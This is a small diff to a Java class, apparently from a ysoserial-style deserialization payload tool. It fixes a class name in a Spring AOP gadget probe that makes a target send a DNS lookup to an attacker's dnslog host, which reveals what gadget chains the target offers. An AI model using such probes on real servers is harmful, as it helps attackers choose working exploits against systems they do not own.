@@ -202,7 +202,7 @@ public class FindGadgetByDNS implements ObjectPayload<Object> {
                 break;
             case "SpringAOP":
                 //fastjon/jackson两个链触发toString的变种,都需要springAOP
-                HashMap springAOP = getURLDNSgadget("http://SpringAOP."+dnslog, "org.springframework.aop.target.HotSwappableTargetSource.HotSwappableTargetSource");
+                HashMap springAOP = getURLDNSgadget("http://SpringAOP."+dnslog, "org.springframework.aop.target.HotSwappableTargetSource");
                 list.add(springAOP);
                 break;
             case "winlinux":
